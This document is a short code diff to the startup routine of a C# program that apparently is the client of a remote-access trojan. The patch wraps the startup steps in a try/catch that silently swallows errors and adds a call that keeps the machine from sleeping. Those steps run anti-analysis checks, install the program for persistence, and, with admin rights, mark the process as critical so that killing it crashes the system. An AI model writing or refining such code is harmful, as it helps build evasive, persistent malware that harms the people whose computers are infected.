@@ -23,17 +23,23 @@ namespace Client
             Thread.Sleep(2500);
             if (!Settings.InitializeSettings()) Environment.Exit(0);
 
-            if (!Methods.CreateMutex())
-                Environment.Exit(0);
+            try
+            {
+                if (!Methods.CreateMutex())
+                    Environment.Exit(0);
 
-            if (Convert.ToBoolean(Settings.Anti))
-                Anti_Analysis.RunAntiAnalysis();
+                if (Convert.ToBoolean(Settings.Anti))
+                    Anti_Analysis.RunAntiAnalysis();
 
-            if (Convert.ToBoolean(Settings.Install))
-                NormalStartup.Install();
+                if (Convert.ToBoolean(Settings.Install))
+                    NormalStartup.Install();
 
-            if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
-                ProcessCritical.Set();
+                if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
+                    ProcessCritical.Set();
+
+                Methods.PreventSleep();
+            }
+            catch { }
 
             while (true)
             {
